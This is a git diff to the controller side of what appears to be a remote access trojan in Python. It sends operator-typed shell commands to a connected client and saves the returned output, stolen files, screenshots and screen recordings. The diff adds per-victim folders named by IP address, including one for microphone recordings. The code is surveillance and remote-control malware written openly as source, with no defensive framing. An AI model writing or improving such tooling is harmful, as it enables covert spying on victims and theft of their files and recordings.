@@ -1,15 +1,22 @@
 import socket
 import json
 import struct
+import os
 
 
+def create_tree(client_address):
+    os.makedirs(client_address[0], exist_ok=True)
+    os.makedirs(f'{client_address[0]}/screenshots', exist_ok=True)
+    os.makedirs(f'{client_address[0]}/screen records', exist_ok=True)
+    os.makedirs(f'{client_address[0]}/mic records', exist_ok=True)
+    os.makedirs(f'{client_address[0]}/files', exist_ok=True)
 # command
 def get_command_input(request):
     command = input("Please enter the wanted command: ")
     request["command"] = command
     return request
 
-def print_command_output(response, request=None):
+def print_command_output(response, client_address, request=None):
     print(f"Received response:\n {response.decode('utf-8')}")
 
 
@@ -19,9 +26,10 @@ def get_file_name(request):
     request["file_name"] = name
     return request
 
-def handle_file(response, request=None):
+
+def handle_file(response, client_address, request=None):
     filename = request.get("file_name", "grabbed_file") if request else "grabbed_file"
-    with open(filename, "wb") as f:
+    with open(f'{client_address[0]}/files/{filename}', "wb") as f:
         f.write(response)
     print(f"File saved as {filename}")
 
@@ -30,8 +38,10 @@ def handle_file(response, request=None):
 def get_screenshot_input(request):
     return request
 
-def handle_screenshot(response, request=None):
-    with open('received_screenshot.png', 'wb') as f:
+
+
+def handle_screenshot(response, client_address, request=None):
+    with open(f'{client_address[0]}/screenshots/received_screenshot.png', 'wb') as f:
         f.write(response)
     print("Screenshot saved.")
 
@@ -43,10 +53,10 @@ def get_time_of_record(request):
     request["duration"] = time
     return request
 
-def save_screen_record(response, request=None):
-    with open('received_record.mp4', 'wb') as f:
+def save_screen_record(response,client_address, request=None):
+    with open(f'{client_address[0]}/screen records/received_record.mp4', 'wb') as f:
         f.write(response)
-        print("record saved.")
+    print("record saved.")
 
 actions = {
     "command": {
@@ -101,6 +111,7 @@ def main():
         # Accept client connection
         client_socket, addr = server_socket.accept()
         print(f"Connected to client: {addr}")
+        create_tree(addr)
 
         while True:
             # Get and send command
@@ -125,7 +136,7 @@ def main():
             # Receive response from client
             response = receive_all(client_socket, size)
             if request["type"] in actions:
-                actions[request["type"]]["output"](response, request)
+                actions[request["type"]]["output"](response, addr, request)
 
     except Exception as e:
         print(f"Error: {e}")
